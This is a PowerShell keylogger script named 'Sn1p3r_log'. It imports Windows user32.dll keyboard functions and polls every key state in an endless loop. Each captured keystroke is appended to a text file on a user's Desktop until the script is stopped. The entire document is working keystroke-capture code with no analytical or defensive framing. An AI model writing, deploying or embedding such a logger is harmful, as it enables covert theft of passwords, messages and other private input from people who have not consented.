function Sn1p3r_log()
{
	$Path = "C:\Users\scott\Desktop\Sn1p3r_log.txt"
	$first_time = 0
	$totalNumber = 0

	# Signatures for API Calls
  	$signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
	# load signatures and make members available
	$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
    
	# create output file
	$null = New-Item -Path $Path -ItemType File -Force

	try
	{

		# create endless loop, collect pressed keys, CTRL+C to exit
		while ($true)
		{
			Start-Sleep -Milliseconds 20

			# scan ASCII codes between 8 and 129
			for ($ascii = 9; $ascii -le 128; $ascii++) 
			{
				# get current key state
				$state = $API::GetAsyncKeyState($ascii)
				# is key pressed?
				if ($state -eq -32767) 
				{
					$null = [console]::CapsLock

					# translate scan code to real code
					$virtualKey = $API::MapVirtualKey($ascii, 3)

					# get keyboard state for virtual keys
					$kbstate = New-Object Byte[] 256
					$checkkbstate = $API::GetKeyboardState($kbstate)

					# prepare a StringBuilder to receive input key
					$mychar = New-Object -TypeName System.Text.StringBuilder

					# translate virtual key
					$success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

					if ($success) 
          			{
						# add key to logger file
						[System.IO.File]::AppendAllText($Path, $mychar.ToString(), [System.Text.Encoding]::Unicode)

						$totalNumber++
          			}
        		}
      		}
    	}
	}
	finally
	{
		Write-Host "Total Number of Keystrokes are $totalNumber" -ForegroundColor Green 
	}
}

# records all key presses until script is aborted by pressing CTRL+C
Sn1p3r_log
